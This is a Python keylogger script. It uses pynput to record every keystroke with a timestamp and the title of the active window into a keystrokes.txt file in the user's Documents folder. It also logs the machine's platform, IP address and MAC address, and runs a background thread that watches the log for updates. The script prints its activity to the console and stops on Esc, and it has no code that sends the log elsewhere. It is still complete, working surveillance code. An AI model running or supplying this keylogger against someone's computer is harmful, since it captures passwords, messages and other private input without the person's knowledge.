import os
from pynput.keyboard import Key, Listener
import platform
import pygetwindow as gw
from datetime import datetime
import socket
import uuid
import time
import threading

# Path to the text file in the Documents folder
documents_path = os.path.join(os.path.expanduser('~'), 'Documents')
log_file_path = os.path.join(documents_path, 'keystrokes.txt')

# Ensure the keystrokes.txt file exists and print a message if created
def initialize_log_file():
    try:
        if not os.path.isfile(log_file_path):
            with open(log_file_path, 'w', encoding='utf-8') as f:
                f.write('')  # Create the file if it doesn't exist
            print("File 'keystrokes.txt' created successfully.")
        else:
            print("File 'keystrokes.txt' already exists.")
    except Exception as e:
        print(f"Error creating log file: {e}")

# Get IP address
def get_ip_address():
    try:
        return socket.gethostbyname(socket.gethostname())
    except Exception as e:
        print(f"Error retrieving IP address: {e}")
        return 'Error retrieving IP address'

# Get MAC address
def get_mac_address():
    try:
        return ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)])
    except Exception as e:
        print(f"Error retrieving MAC address: {e}")
        return 'Error retrieving MAC address'

def check_log_changes():
    while True:
        try:
            current_modification_time = os.path.getmtime(log_file_path)
            time.sleep(60)  # Check every minute
            if os.path.getmtime(log_file_path) != current_modification_time:
                # Log file has changed, print a message
                with open(log_file_path, 'r', encoding='utf-8') as f:
                    message = f.read()
                print("Keystroke log updated.")
        except Exception as e:
            print(f"Error checking log changes: {e}")

def on_press(key):
    try:
        active_window = gw.getActiveWindow()
        now = datetime.now()
        current_time = now.strftime("%Y-%m-%d %H:%M:%S")
        with open(log_file_path, 'a', encoding='utf-8') as f:
            if hasattr(key, 'char'):
                f.write(f"{current_time} - {active_window.title if active_window else 'Unknown Window'}: {key.char}\n")
                print(f"Logged: {key.char}")
            else:
                f.write(f"{current_time} - {active_window.title if active_window else 'Unknown Window'}: {key}\n")
                print(f"Logged: {key}")
    except Exception as e:
        print(f"Error on_press: {e}")

def on_release(key):
    if key == Key.esc:
        return False  # Stop listener

def write_initial_info():
    try:
        with open(log_file_path, 'a', encoding='utf-8') as f:
            platform_info = platform.platform()
            f.write("Platform: {}\n".format(platform_info))
            f.write(f"IP Address: {get_ip_address()}\n")
            f.write(f"MAC Address: {get_mac_address()}\n")
    except Exception as e:
        print(f"Error writing initial information: {e}")

def main():
    initialize_log_file()
    write_initial_info()

    # Start a separate thread to check for log file changes
    try:
        check_log_thread = threading.Thread(target=check_log_changes)
        check_log_thread.daemon = True  # Daemonize the thread so it terminates when the main program ends
        check_log_thread.start()
    except Exception as e:
        print(f"Error starting log check thread: {e}")

    # Collect events until released
    try:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        print(f"Error starting listener: {e}")

if __name__ == "__main__":
    main()
